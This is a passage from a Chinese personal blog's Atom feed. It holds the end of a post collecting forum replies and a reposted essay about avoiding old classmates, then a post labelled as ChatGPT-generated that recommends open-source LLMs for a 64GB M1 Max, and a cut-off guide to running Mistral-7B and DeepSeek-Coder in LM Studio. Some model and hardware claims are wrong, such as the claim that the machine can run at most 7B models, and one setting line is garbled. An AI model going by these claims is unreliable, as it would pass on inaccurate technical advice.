3.今天天气真好，我们来八卦一下吧</p></blockquote></li><li><p><strong>nl101531</strong></p><blockquote><p>觉得问题的本质是对混得好这一概念，大众的理解等价于财富多，权力大。</p><p>自己能看开就好，身体健康，阖家欢乐，高高兴兴上班，平平安安下班，认为这也是一种混得好也就不介意了。。。</p></blockquote></li><li><p><strong>Duluku</strong></p><blockquote><p>个人觉得可能是内心觉得比别人优秀、因为之前一直自己觉得比你的那些同学过得好、更有出息？<br>殊不知学校建立的成绩的优越感，到了新的社会环境中被洗刷的一干二净、人家成绩不好但是家里有钱，很轻松也能过上好日子。所以是不是放下心中的优越感？拙见拙见、如有不对、恳请各位大佬赐教</p></blockquote></li><li><p><strong>Donald5VE</strong></p><blockquote><p>混的好的，有的不屑于和自己差的人浪费时间交流所谓的感情。</p><p>混的差的，又不愿意自己的窘境被人知道。</p><p>至于好和坏，其实是看自己的判断。</p></blockquote></li><li><p><strong>Zeonjl</strong></p><blockquote><p>出于感情方面，无他</p></blockquote></li><li><p><strong>Tyler1989</strong></p><blockquote><p>同桌同寝室的有见面，其他不熟的还是算了，没啥好聊的</p></blockquote></li><li><p><strong>wolf1981</strong></p><blockquote><p>最近微信群里在筹备初中 20 周年同学会，看下了报名单发现同学的名字和他们的面貌已经联系不起来了，想想这多年都没交流过，见了面也不知道聊什么，多半还是看手机的多，就说忙不去了</p></blockquote></li><li><p><strong>liberize</strong></p><blockquote><p>同感</p></blockquote></li><li><p><strong>hematite</strong></p><blockquote><p>转篇文章</p><p>《当你觉得自己不好意思联系人家的时候，你知道人家怎么想吗？》</p><p>2013-06-27 12:15:42</p><p>大学同学，我联系并不多，因为经常觉得自己混得不怎样。同学里现在有亿万富翁，有学术牛人，有任职于英国顶尖建筑师事务所的工程师，还有一大堆博士已经毕业，自己实在只能算个混混。另外同学聚会我总是单刀赴会，人家各个结婚生孩子，多少有些挂不住脸。在外地落户的同学，就更少联系了。</p><p>今年自从开春开始，一连遇上一些状况，我就愈发过得昏昏噩噩。上周日上午，当年大学宿舍里三年和我床尾对床尾的室友 Z 突然打来电话，告诉我他人在北京，第二天就要回福建了；因为现在很少再回到北京，很想见我一下，并且说当天时间充裕，随时有空。我们确实已经多年不见。我当天任务排得比较满，本来晚上六点到八点间要去清华听一个关于在线教育的讲座，这前后还都有些事情，只能告诉他我有空就联系他。</p><p>等我有空了的时候，他已经回到了母校。于是我径直过去，到达的时候已经接近六点，到了开始在线教育讲座的时候了。我本来想去自己听一耳朵马上出来会他，他却电话里告诉我他也可能感兴趣，干脆一起去听听好了。</p><p>当穿着一身身体面却也普通的商务休闲装的他爬上讲座所在的清华教育学院办公楼的楼梯出现在我眼前时，我发现他样子没有什么明显的变 化，当年清秀又干练的娃娃脸五官比例都依旧，只是明显神情中开始透着一丝严肃，一丝矜持，比当年少了些嘻嘻哈哈的随意多了些克制。我们简单打了个招呼，就进了讲座的教室。没待我们寒暄几句，讲座就开始了。</p><p>主讲人是一位芝加哥大学的博士候选人，他大概是想让同学们体会一下美国大学里大凡讲座都有 free food 的气氛，订了三十多份盒饭免费放在那里，随吃随取不要钱。谁想到也不知道是同学们吃过了还是不好意思，没有几个人吃饭。讲座从六点一下子讲到八点，过了我每天七点必吃晚饭的时间。我是个小处随便的人，饿了，就抓过一碗盒饭狂吃起来。里面的卤肉饭蛮地道，还有两片卤牛肉也很不错。我好几次问身边的 Z，要不要吃碗饭，反正这饭不吃他们也没地方处理，他说不用了。我想那也好，本来我是要晚上好好请他吃点东西的，这么多年没有见不容易。我过了七点之后又暗地问他，要不要我们提前开溜，这样我们可以自己聊自己的。他就说，还是听完吧，应该快了。</p><p>过了八点讲座才完，我已经基本吃饱，老同学想必还是饿着肚子，我带他去找饭馆。路上我问他，晚上是不是没别的安排了。他告诉我其实还有好几个人要见，不过先和我聊完再说。我意识到晚上实在不该拉他去那个讲座，耽误了他时间。不过他却说，不要紧，他也在考虑创业，各种行业的机会，他都愿意了解了解。也是，他在那家外企应该工作六年了，现在一定在能力、见识、资历、人脉上都积蓄已久，蓄势待发了吧。</p><p>谈起创业，我和他谈到我们班现在唯一一个创业已立业的同学，我春节时候日志中专文记述的那位王老板。我跟 Z 讲了王老板当年上学时候谋生的不易，怎么外出当家教、买手机电脑等等挣钱，怎样在交通上辛苦，等等。Z 笑笑，说，这样的事情其实我都干过，也一点不少，你不知道罢了。咱们同学里，还是有不少人在学校的时候挺苦的。我知道，在我们班那几个苦孩子眼中，用现在的语言说，我是个不折不扣的风吹不着雨淋不着的官二代。虽然我一向俭朴，但是生活一直是舒适的。而我当年在一群工科学生中表现出的一点人文艺术修养，更会让其它孩子解读为某种优越。</p><p>我们走到清华东门外的那边小商业区，那个我们上学的时候还不存在的建筑群。我问他这些饭馆你想去哪个，没想到他径直走进了一家桂林米粉。我觉得这也太不合适了，说你好不容易来一次，咱们还是去个好点的地方吧。他却说，我很习惯这样的小店，就这里好了。我明白了，朴素简单的环境可能让他更放松更舒适。</p><p>记得在美国留学第一年结束的时候，回国带他和班里其他几个同学，到新开业的五道口华联商厦里的一家希腊还是意大利餐厅吃了顿饭，人均大概 70 元，那时候挣着美元的我多少有些自豪，招待老同学的时候说这个地方还是比较合算，Z 大约是拍了下我的肩头，跟我说，还是有很多老百姓舍不得这样请客的。那时候他好像还在系里一个博士生手下做杂活儿，还是个苦力。</p><p>我们当年班上有几个人因为挂科多了，没有按时毕业，他是一个。其实我一直知道他很聪明，也学习能力很强，有兴趣的事情很有钻研精神。只是大二的时候他打游戏好像疯了一样，耽误了不少功课。记得那时候他妈妈心急如焚，写信到学校来，让我看到了，后来我已经完全不记得怎么帮助过他——大概其实也没有怎样，也就是经常从家里带些水果什么的分给宿舍几个人吃——就记得毕业的时候突然收到她妈妈发来的一条很长的短信——里面有些词汇好像清朝白话，一看就是南方的传统家庭妇女的语言——很感恩地说我怎样帮助了她，搞得我很不好意思。事实是：毕业的时候，我虽然对这个专业没有一点感情也几乎没有学进去一点实用的东西，但是因为没有挂科学分也排名居中，没有和人家抢保研名额走上了出国的外表光鲜的道路，因此好像还挺有点被人羡慕；而 Z 其实对专业的知识掌握、理解得非常全面透彻，而且已经做过一些项目，相当有经验——包括其实我之所以能顺利毕业，是因为一些重要的课程的作业，包括我们那个院士系主任开的 XX 自动化的编程作业，也是很大程度上他给我操刀的——可是却因为大二几门课挂科，没有毕业。这就是中国教育制度荒唐的一个具体事例，一个平庸之辈得到肯定，而一个真正的有能力有潜力有干劲儿的学生却倍受打击。</p><p>他挂科的原因，我原来一直以为他大二时候情感压抑，痴迷游戏释放压力。大学的时候，每年到了某一天，他会独自在宿舍里喝酒。那是他父亲的忌日，他高中的时候父亲突然去世。一方面这使得他家剩下的母子俩更为贫寒，另一方面，大概也让他少了一个非常亲密的人。我能感觉到父亲对他有多重要。我那时一方面觉得隐约有些理解他的痛苦，另一方面还是觉得他太贪玩。不过今天谈到创业，他才问我，“你没发现我大学时候有一阵子都是早上玩游戏吗？”“嗯。”</p><p>往事不堪回首，可是还是要回首。他点的米线上来的时候，他告诉我，今天一见到我的时候就能看得出来我状态不好，能讲讲原因？我有些吃惊，一般人见到我的时候，都会以为我是个快乐开心的人，能看出我的内心状态，恐怕因为他是我老同学，他是个对人有慧眼的老同学，而且他和当年天真快乐的小孩不一样了，他看得更深了。其实我上大学的时候一直不快乐，不过好像那时候他并没有怎么问我这个问题。</p><p>不过让我讲出内心这些年的感受，实在是个不容易的事情。多少有些挣扎。尤其是，自打我去了美国之后，我愈发少跟人诉苦了。确实诉苦经常没什么用，还会让不太熟悉的人产生误解。我盯着餐桌上的餐巾纸，犹豫再三。不过想到今晚也没有时间慢慢叙谈，之后再当面相见也许又要几年，于是就干脆直接揭开伤口。</p><p>我问他，你看我大学时候一直没有女朋友，现在也没有结婚，你觉得是为什么？</p><p>他很聪明，很快就猜到了答案。而且如我所料，他完全对这件事情不介意。我上大学的时候总把自己生活中某些东西遮掩起来。但是其实后来我发现这种担心是多余的，我在美国的时候有一次回国，召集舍友吃饭，Z 就谈起同性话题，表示完全理解。我知道他对人性的洞察和理解，是远远在一般人之上的。</p><p>具体我们讲了什么，这里就不多说了。不过大概是，我告诉了他从当年到后来，我生活中有些很憋屈的事情，其实也没有外人看来那样舒服开心。一个小时的时间，还是不够深谈内心的感受，我能感到他想努力说服我振作起来，不过毕竟三言两语，各自内心的感受都很难讲清楚，我也能感到，他所理解的我的纠结，其实并不是我现在的纠结，至多是我现在的纠结的一个来源罢了。</p><p>九点半，我把他送上出租车。个头不高的 Z 临走抛下一句很符合他的个性的豪迈的话：“今天你应该觉得很高兴吧，因为又多了一个理解你的人。”我跟他说，虽然我之前没有和他讲我的很多事情，其实我一直知道他是个理解我的人。看他乘车远去，我有一丝伤感，虽然只是片刻：一个可以如此理解我的人，却只有在分别这么多年之后，我才主动给了他一点理解我的机会。</p><p>回头想想，从小到大，很多对我的人生非常重要的人，我却一再客观上疏远。因为我总是觉得，自己不够好，不好意思联系人家。小学的时候一个姓张的教数学的副校长爷爷特别赏识我，在奥赛班里特别给我吃小灶，一直到特别关照把我送进了学区里最好的初中。离开小学后，我一直特别惦记这位校长，却再也没有去看过他。因为我上初中之后失去了对数学的热爱，自己觉得学得也不太明白，一直觉得没脸去见他。直到若干年过去，他应该早已退休，原来他家所在的那片居民楼被拆掉，我才意识到，可能茫茫人海中再也找不到我的这个恩人了。但愿张校长不会觉得我忘恩负义，只是忘记了我这个缺心眼的学生吧。</p><p>小学时代有个知己，同年同月同日生，他家离我家只有走路十几分钟的距离，都是奥数班里的数学尖子，加上三四年级时候三环路修路，没有公交，一起上下学搭伴走来走去一年，成了最好的铁哥们儿。可是后来进入初中之后，我失去了对数学的兴趣，他却一直做奥数如鱼得水乐此不疲；而且小学时候我比他高，进入初中之后他很快蹿到了 185 的水平，又是学校的足球明星吸引女生无数，还会吹管乐，导致我有意无意地感觉自卑，淡化了他的关系。却也能感觉到，他从来把我还是当个朋友。后来我们都进了北京最好的高中，他还是成绩一直比我好，直到高考突然出现闪失，我超常发挥进入清华，他却一下子跌进了北工大。于是之后，又变成了可能他不好意思联系我，总之我们大学阶段联系更加稀疏。大学毕业之后，他拿到了加州大学的全奖，我去了密苏里，三年之后我半途而废，他现在早已博士毕业在美国药厂工作了。我们俩个很有意思，起起伏伏，大概总是一个人觉得和另一个人比有些不好意思。说起来，他其实是一个多么好的人啊，却一而再再而三地，我由于种种其实没有太多必要的敏感，没有和他深入发展友谊，没有和他称为那种真正贴心的朋友。</p><p>当年清华艺术团我们的 H 大姐，一个非常干练爽快的大美女，虽然我只是大一的时候在那里短短地参加过一年的活动，却一直对我持续关怀，后来她去了剑桥、去了联合国、去了世界银行都和我联系，我在华盛顿的时候她给我找住处，我留学期间放假回国的时候已经派驻国内的她给我引荐各种高人。可是等我放弃美国学位回国之后，却没有好意思再去联系她，总觉得自己灰头土脸给她丢脸。结果一年过去，两年过去，现在四五年过去，压根也不知道她在哪里做什么，但愿她如果偶尔想起我这个小弟，不要觉得我太不知感恩。</p><p>当年清华人文学院的张教授，在所在学科是个大人物，和我偶然相识之后却热心指教我，直到我出国后还和我联系，我放假回国的时候请我吃饭聊天。可是同样，等我真彻底回国之后，我又不好意思跟他讲我放弃了学业，没有和他继续联系。后来这些年在一些书籍中看到他的一些事情，包括发现他还是我的高中校友，心中虽然有很多和他聊聊天的愿望，却实在不知道怎么开口了。</p><p>还有太多的中学老师、大学老师、中学同学、大学同学，等等，我因为觉得自己之后上学的时候成绩不够好，出国之后研究搞得不搞好，回来工作之后某些方面境遇不好，没有和人家联系。我是自卑，可是因为我没有和人家沟通，人家根本没法了解我的这种心情。他们反而有可能觉得是我认为他们不重要，而这，其实完全不是我想看到的。</p><p>Z 第二天微信上给我发了个消息，说当年大学的时候，大家都以为我是个特别与众不同、不食人间烟火的人。我知道，我错过了很多。当年我以为远离大家可以让我不少些麻烦，其实却是对不住大家对我的关心。现在想想，其实那些真的可以做朋友的人，又怎么会那样计较你到底数学水平怎么样、论文发了几篇、钱挣了多少、男朋友女朋友谈过几个呢？如果我们真的觉得自己是个可爱的人，是个值得拥有朋友的人，就不要再自卑彷徨，打开自己，真心地告诉关心你的人：我有时候挺惨，但是你们可以带给我快乐。</p><p>Original Page: <a href="http://www.douban.com/note/284817572/">http://www.douban.com/note/284817572/</a></p></blockquote></li><li><p><strong>Chaos11</strong></p><blockquote><p>感同身受</p><p>没有像 po 主学生时代一样常年第一，但心气很高，现状虽然算不上差但也配不上自己的预期</p><p>虽然自身努力有时候确实占很大比重，但外部因素影响谁也没法否认</p><p>特别是在这种历史大进程中，个人，家庭都是一粒尘埃</p></blockquote></li><li><p><strong>Chaos11</strong></p><blockquote><p>不小心敲了回车</p><p>看到个别当年不在眼里的同学混得很好</p><p>说嫉妒谈不上，但心里肯定是不甘的，自然就不想见了</p><p>碍于自尊吧很正常，所以还是开心就好吧，想见见不想见不见，没什么的</p></blockquote></li><li><p><strong>Mavius</strong></p><blockquote><p>同意 lz 的娘…因为我也不想见同学，干一个类似外包临时工的活儿，混的不容易，觉得”无脸见人”，估计老同学们个个混的风生水起吧。</p><p>至少一个小学同学成了乐视名主持，炮轰 xx 球队导致球迷们群起攻之，还在百毒有了词条。</p><p>看人家风生水起，觉得自己就没面子。不去不去了。看着别人春风得意觉得无地自容。</p></blockquote></li><li><p><strong>SNOOPY963</strong></p><blockquote><p>有句不中听的，这样的心态就是不知道求啥那就求个第一导致的。</p><p>楼主应该先找到自己追求的东西，有自己追求的东西哪还在乎挂不挂得住脸面什么的。</p><p>不过，不管怎么样，人要和其他东西建立联系。不联系老同学也没关系，但也要有自己联系的人。人生才刚开始呢，怎么能说是下滑呢。未来怎么样还未知呢。</p></blockquote></li><li><p><strong>acupnocup</strong></p><blockquote><p>嗯 实际都一样</p><p>我跟我哥们仨个人都是数理化经常满分的</p><p>现在一个在湾区 一个在四大</p><p>就我一个人还在做穷逼</p></blockquote></li><li><p><strong>acupnocup</strong></p><blockquote><p>还是只能说自己不努力</p><p>所在的平台一直都是最好的</p><p>可惜我还是更喜欢懒散和游戏。</p></blockquote></li></ol><hr><h5 id="帖子地址"><a href="#帖子地址" class="headerlink" title="帖子地址"></a>帖子地址</h5><p><a href="https://v2ex.com/t/458398">https://v2ex.com/t/458398</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;越来越快，越来越少&quot;&gt;&lt;a href=&quot;#越来越快，越来越少&quot; class=&quot;headerlink&quot; title=&quot;越来越快，越来越少&quot;&gt;&lt;/a&gt;越来越快，越来越少&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在信息过载的今天&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;你还记得上</summary>
      
    
    
    
    <category term="碎碎念" scheme="http://damao2250.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    
    <category term="碎碎念" scheme="http://damao2250.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
    <category term="阅读记录" scheme="http://damao2250.com/tags/%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>开源大模型选型与M1Max最佳开源模型推荐</title>
    <link href="http://damao2250.com/2025/04/28/%E5%BC%80%E6%BA%90%E5%A4%A7%E6%A8%A1%E5%9E%8B%E9%80%89%E5%9E%8B%E4%B8%8EM1Max%E6%9C%80%E4%BD%B3%E5%BC%80%E6%BA%90%E6%A8%A1%E5%9E%8B%E6%8E%A8%E8%8D%90/"/>
    <id>http://damao2250.com/2025/04/28/%E5%BC%80%E6%BA%90%E5%A4%A7%E6%A8%A1%E5%9E%8B%E9%80%89%E5%9E%8B%E4%B8%8EM1Max%E6%9C%80%E4%BD%B3%E5%BC%80%E6%BA%90%E6%A8%A1%E5%9E%8B%E6%8E%A8%E8%8D%90/</id>
    <published>2025-04-28T06:43:54.000Z</published>
    <updated>2025-05-09T04:06:36.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开源大模型选型与M1-Max最佳开源模型推荐"><a href="#开源大模型选型与M1-Max最佳开源模型推荐" class="headerlink" title="开源大模型选型与M1 Max最佳开源模型推荐"></a>开源大模型选型与M1 Max最佳开源模型推荐</h1><p>随着开源大模型的发展，越来越多强大的语言模型、视觉模型、多模态模型涌现出来，满足了不同应用场景的需求。从通用对话、代码生成到图像生成、边缘设备部署，每种模型都有其独特的优势。本文将帮助你了解当前主流的开源大模型，并推荐适合在Mac M1 Max（64GB内存）上运行的最佳开源模型，专门面向代码生成和日常搜索问答等应用场景。</p><hr><h2 id="一、当前主流并且强大的开源模型"><a href="#一、当前主流并且强大的开源模型" class="headerlink" title="一、当前主流并且强大的开源模型"></a>一、当前主流并且强大的开源模型</h2><p>目前，主流且强大的开源大模型按类型可以分为语言模型（LLMs）、多模态模型和视觉生成模型。以下是每个领域的一些代表性模型：</p><h3 id="1-语言模型（LLMs）"><a href="#1-语言模型（LLMs）" class="headerlink" title="1. 语言模型（LLMs）"></a>1. 语言模型（LLMs）</h3><ul><li><p><strong>Meta LLaMA 3（7B、70B）</strong><br>近似GPT-4的性能，尤其是70B版本，在开源大模型中处于顶级水平。</p></li><li><p><strong>Mistral 7B / Mixtral 8x7B</strong><br>Mistral 7B是轻量但高效的模型，而Mixtral 8x7B则采用Mixture of Experts架构，推理时激活部分专家，性能接近GPT-4。</p></li><li><p><strong>Qwen 系列（通义千问）</strong><br>阿里巴巴出品的Qwen-1.5-72B等模型，具备超强的中文多语言能力。</p></li><li><p><strong>DeepSeek LLM</strong><br>性能强劲，接近Mixtral和LLaMA 3，特别适合商业化应用。</p></li><li><p><strong>Command R+（By Cohere）</strong><br>专注于指令跟随任务，适合微调和应用开发。</p></li></ul><h3 id="2-多模态模型（文字-图片理解、生成）"><a href="#2-多模态模型（文字-图片理解、生成）" class="headerlink" title="2. 多模态模型（文字+图片理解、生成）"></a>2. 多模态模型（文字+图片理解、生成）</h3><ul><li><p><strong>LLaVA-1.5 / LLaVA-Next</strong><br>基于语言大模型的视觉问答系统，受到开源社区的广泛欢迎。</p></li><li><p><strong>Qwen-VL</strong><br>多模态能力超强，支持复杂推理和详细描述，特别适合中文。</p></li><li><p><strong>MiniGPT-4</strong><br>轻量版，模仿GPT-4V的思路，适合嵌入式部署。</p></li><li><p><strong>InternVL</strong><br>商汤科技出品，强大的视觉理解和推理能力，支持复杂视觉任务。</p></li></ul><h3 id="3-视觉生成模型（图像、视频）"><a href="#3-视觉生成模型（图像、视频）" class="headerlink" title="3. 视觉生成模型（图像、视频）"></a>3. 视觉生成模型（图像、视频）</h3><ul><li><p><strong>Stable Diffusion 3（SD3）</strong><br>强大的文本到图像生成能力，能够生成复杂的高质量图像。</p></li><li><p><strong>Stable Video Diffusion</strong><br>基于扩散模型的开源视频生成模型，画面流畅，细节表现优秀。</p></li><li><p><strong>SDXL (Stable Diffusion XL)</strong><br>高质量的文本到图像生成，生成图像更自然，艺术感更强。</p></li></ul><hr><h2 id="二、应用场景-×-推荐模型"><a href="#二、应用场景-×-推荐模型" class="headerlink" title="二、应用场景 × 推荐模型"></a>二、应用场景 × 推荐模型</h2><p>不同应用场景需要选择合适的模型，以下是几个常见应用场景和推荐模型的对照：</p><table><thead><tr><th align="left">应用场景</th><th align="left">推荐模型</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left"><strong>通用对话（英文、全球化）</strong></td><td align="left">LLaMA 3 70B / Mixtral 8x7B</td><td align="left">近GPT-4水平，性能顶尖</td></tr><tr><td align="left"><strong>中文对话 / 中文任务处理</strong></td><td align="left">Qwen-1.5-72B / Baichuan2-13B</td><td align="left">中文理解与生成极强</td></tr><tr><td align="left"><strong>超轻量推理（低算力部署）</strong></td><td align="left">Mistral 7B / Phi-2</td><td align="left">小而强，适合边缘设备</td></tr><tr><td align="left"><strong>指令跟随（任务型机器人、问答）</strong></td><td align="left">Command R+ / WizardLM 2</td><td align="left">指令理解特别好，执行准确</td></tr><tr><td align="left"><strong>多模态（看图说话、视觉问答）</strong></td><td align="left">Qwen-VL / LLaVA-Next / MiniGPT-4</td><td align="left">处理图文混合输入，问答推理能力强</td></tr><tr><td align="left"><strong>文本生成图像（设计、艺术）</strong></td><td align="left">Stable Diffusion 3 / SDXL</td><td align="left">超强绘画与艺术生成</td></tr><tr><td align="left"><strong>文本生成视频（短视频内容）</strong></td><td align="left">Stable Video Diffusion</td><td align="left">当前开源中最流畅的视频生成模型</td></tr><tr><td align="left"><strong>企业内部微调开发</strong></td><td align="left">DeepSeek LLM / Mistral 7B</td><td align="left">开源协议友好，适合商业化落地</td></tr><tr><td align="left"><strong>高性能中文+代码能力</strong></td><td align="left">Qwen-1.5-72B / DeepSeek LLM</td><td align="left">对中文和代码理解生成非常优秀</td></tr><tr><td align="left"><strong>边缘端多语言应用</strong></td><td align="left">Gemma 7B / Phi-2</td><td align="left">体积小，支持多语言</td></tr></tbody></table><p>简单总结：</p><ul><li><strong>超大模型</strong>：LLaMA 3 70B、Qwen-72B、Mixtral 8x7B</li><li><strong>轻量部署</strong>：Mistral 7B、Phi-2</li><li><strong>多模态处理</strong>：LLaVA-Next、Qwen-VL</li><li><strong>图像生成</strong>：Stable Diffusion 3</li><li><strong>中文特别强的</strong>：Qwen 系列、Baichuan2 系列</li></ul><hr><h2 id="三、在M1-Max上推荐能跑的最佳开源模型清单（用于代码生成、日常搜索问答等）"><a href="#三、在M1-Max上推荐能跑的最佳开源模型清单（用于代码生成、日常搜索问答等）" class="headerlink" title="三、在M1 Max上推荐能跑的最佳开源模型清单（用于代码生成、日常搜索问答等）"></a>三、在M1 Max上推荐能跑的最佳开源模型清单（用于代码生成、日常搜索问答等）</h2><p>针对M1 Max（64GB内存）这一硬件，以下是推荐的适合用于代码生成、日常搜索问答等任务的最佳开源模型。考虑到M1 Max的硬件性能，选用了适配性强且流畅运行的小体积模型。</p><h4 id="推荐模型清单："><a href="#推荐模型清单：" class="headerlink" title="推荐模型清单："></a>推荐模型清单：</h4><table><thead><tr><th>模型名</th><th align="left">参数规模</th><th align="left">推荐量化</th><th align="left">特点</th></tr></thead><tbody><tr><td><strong>DeepSeek-Coder 6.7B</strong></td><td align="left">6.7B</td><td align="left">4bit</td><td align="left">强大的代码生成能力，支持中英文代码的生成和理解</td></tr><tr><td><strong>CodeLlama-7B</strong></td><td align="left">7B</td><td align="left">4bit</td><td align="left">专业代码生成模型，支持多种编程语言</td></tr><tr><td><strong>Mistral-7B-Instruct</strong></td><td align="left">7B</td><td align="left">4bit</td><td align="left">高效通用问答，指令跟随能力出色</td></tr><tr><td><strong>Qwen-7B-Chat</strong></td><td align="left">7B</td><td align="left">4bit</td><td align="left">中英文问答都能流畅处理，代码生成能力也不错</td></tr><tr><td><strong>Phi-2 (2.7B)</strong></td><td align="left">2.7B</td><td align="left">4bit</td><td align="left">超小体积，日常问答流畅，适合边缘部署</td></tr><tr><td><strong>DeepSeek-LM 7B</strong></td><td align="left">7B</td><td align="left">4bit</td><td align="left">强大的中文问答和推理能力，适合搜索和聊天场景</td></tr><tr><td><strong>TinyLlama-1.1B</strong></td><td align="left">1.1B</td><td align="left">4bit</td><td align="left">极限轻量，适合离线搜索、快速问答助手</td></tr></tbody></table><h4 id="推荐运行方式："><a href="#推荐运行方式：" class="headerlink" title="推荐运行方式："></a>推荐运行方式：</h4><ul><li><strong>量化格式</strong>：使用GGUF格式并量化为4bit（如Q4_K_M或Q5_K_M），这将提供最佳的性能。</li><li><strong>推理框架</strong>：建议使用<strong>LM Studio</strong>或<strong>Ollama</strong>本地推理框架，这些框架能自动调用Metal加速，让M1 Max发挥最佳性能。</li><li><strong>上下文长度</strong>：选用支持4K token以上的模型（如DeepSeek-Coder支持16K，Mistral-7B-Instruct支持8K以上），这样可以使搜索和代码生成体验更顺畅。</li></ul><h4 id="场景最佳组合推荐："><a href="#场景最佳组合推荐：" class="headerlink" title="场景最佳组合推荐："></a>场景最佳组合推荐：</h4><table><thead><tr><th>具体需求</th><th>最优模型</th></tr></thead><tbody><tr><td>写代码 / 补全</td><td>DeepSeek-Coder 6.7B / CodeLlama-7B</td></tr><tr><td>搜索式提问</td><td>Mistral-7B-Instruct / Qwen-7B-Chat</td></tr><tr><td>中文搜索/答题</td><td>Qwen-7B-Chat / DeepSeek-LM 7B</td></tr><tr><td>极限轻量离线助手</td><td>Phi-2 / TinyLlama-1.1B</td></tr></tbody></table><hr><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>对于M1 Max，最多可运行7B参数规模的模型，量化后能进一步提升性能。</li><li>如果需要进行代码生成、日常问答，选择适合的量化版本（如4bit）和推理框架（如LM Studio、Ollama）能带来顺畅的体验。</li><li>根据具体需求，选择合适的模型可以大大提升工作效率。</li></ul><h1 id="注意：本文由ChatGPT生成"><a href="#注意：本文由ChatGPT生成" class="headerlink" title="注意：本文由ChatGPT生成"></a>注意：本文由ChatGPT生成</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;开源大模型选型与M1-Max最佳开源模型推荐&quot;&gt;&lt;a href=&quot;#开源大模型选型与M1-Max最佳开源模型推荐&quot; class=&quot;headerlink&quot; title=&quot;开源大模型选型与M1 Max最佳开源模型推荐&quot;&gt;&lt;/a&gt;开源大模型选型与M1 Max最佳开源模型</summary>
      
    
    
    
    <category term="AI" scheme="http://damao2250.com/categories/AI/"/>
    
    
    <category term="开源模型" scheme="http://damao2250.com/tags/%E5%BC%80%E6%BA%90%E6%A8%A1%E5%9E%8B/"/>
    
    <category term="AI模型" scheme="http://damao2250.com/tags/AI%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>Mistral-7B-Instruct和DeepSeek-Coder-6.7B开源AI体验入门指南</title>
    <link href="http://damao2250.com/2025/04/28/Mistral-7B-Instruct%E5%92%8CDeepSeek-Coder-6-7B%E5%BC%80%E6%BA%90AI%E4%BD%93%E9%AA%8C%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
    <id>http://damao2250.com/2025/04/28/Mistral-7B-Instruct%E5%92%8CDeepSeek-Coder-6-7B%E5%BC%80%E6%BA%90AI%E4%BD%93%E9%AA%8C%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</id>
    <published>2025-04-28T06:19:58.000Z</published>
    <updated>2025-05-09T04:06:36.960Z</updated>
    
    <content type="html"><![CDATA[<p>如果你用的是MacBook M1 Max，有着不错的64GB综合内存，且想在本地运行强大的开源大模型，用于日常搜索问答、代码生成，那么Mistral-7B-Instruct + DeepSeek-Coder-6.7B是相当理想的组合！本文将手把手教你，如何开始简单且享受开源大模型的快感体验！</p><hr><h1 id="一、选择合适的模型"><a href="#一、选择合适的模型" class="headerlink" title="一、选择合适的模型"></a>一、选择合适的模型</h1><p>根据你的需求（代码生成+搜索问答），下面是最适合M1 Max运行的模型列表：</p><table><thead><tr><th align="left">模型名称</th><th align="left">参数规模</th><th align="left">特点</th></tr></thead><tbody><tr><td align="left">Mistral-7B-Instruct</td><td align="left">7B</td><td align="left">指令跟随性高，答题精准、简洁</td></tr><tr><td align="left">DeepSeek-Coder-6.7B</td><td align="left">6.7B</td><td align="left">最新代码生成大模型，支持中英文代码）</td></tr></tbody></table><p>大模型就选这两个，比起72B这种过大模型，不会压力，运行流畅，并且效果优秀。</p><hr><h1 id="二、清晰流程一览图"><a href="#二、清晰流程一览图" class="headerlink" title="二、清晰流程一览图"></a>二、清晰流程一览图</h1><p>参考下面这张流程图：<br><img src="https://raw.githubusercontent.com/Damao2250/FileTransfer/master/RunningMistral-7B-Instruct+DeepSeek-Coder6.7B.png" alt="Running Mistral-7B-Instruct + DeepSeek-Coder 6.7B"></p><hr><h1 id="三、详细操作步骤"><a href="#三、详细操作步骤" class="headerlink" title="三、详细操作步骤"></a>三、详细操作步骤</h1><h2 id="1-安装-LM-Studio"><a href="#1-安装-LM-Studio" class="headerlink" title="1.安装 LM Studio"></a>1.安装 LM Studio</h2><ul><li>访问：<a href="https://lmstudio.ai/">https://lmstudio.ai/</a></li><li>下载macOS版，直接安装</li><li>开启后看到第一行 <strong>“Metal Backend Activated”</strong> 就说明已经启用M1 Max硬件加速</li></ul><h2 id="2-下载合适的模型（GGUF格式）"><a href="#2-下载合适的模型（GGUF格式）" class="headerlink" title="2.下载合适的模型（GGUF格式）"></a>2.下载合适的模型（GGUF格式）</h2><ul><li><strong>Mistral-7B-Instruct</strong> <a href="https://huggingface.co/TheBloke/Mistral-7B-Instruct-v0.2-GGUF">下载地址</a></li><li><strong>DeepSeek-Coder-6.7B</strong> <a href="https://huggingface.co/TheBloke/deepseek-coder-6.7B-base-GGUF">下载地址</a></li></ul><p>选择 <strong>Q4_K_M</strong> 量化版，性能和内存使用不错。</p><h2 id="3-将模型导入到-LM-Studio"><a href="#3-将模型导入到-LM-Studio" class="headerlink" title="3.将模型导入到 LM Studio"></a>3.将模型导入到 LM Studio</h2><ul><li>打开LM Studio → 选择”Local Models” → 点”Import Model”</li><li>选择下载的<code>.gguf</code>文件</li><li>导入成功后，直接点”Chat” 就可以使用了</li></ul><h2 id="4-建议配置设置"><a href="#4-建议配置设置" class="headerlink" title="4.建议配置设置"></a>4.建议配置设置</h2><ul><li>Context length：4096 tokens 或更多</li><li>Batch size：设置成16，或使用自动</li><li>CPU offload：如果太70可以开启</li></ul><hr><h1 id="四、各自的最佳使用场景"><a href="#四、各自的最佳使用场景" class="headerlink" title="四、各自的最佳使用场景"></a>四、各自的最佳使用场景</h1><table><thead><tr><th align="left">场景</th><th align="left">最佳模型</th></tr></thead><tbody><tr><td align="left">代码生成</td><td align="left">DeepSeek-Coder-6.7B</td></tr><tr><td align="left">搜索问答</td><td 